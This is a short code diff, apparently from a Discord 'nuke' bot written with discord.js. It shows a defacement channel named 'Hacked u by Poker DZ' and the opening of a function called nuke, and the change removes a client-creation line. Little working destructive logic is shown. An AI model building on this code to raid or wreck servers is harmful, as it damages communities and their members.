@@ -438,7 +438,6 @@ m.createChannel('Hacked u by Poker DZ', 'voice');
  
  
 const { Client } = require('discord.js');
-const client = new Client();
  
 async function nuke(guild) {
   let users = 0;
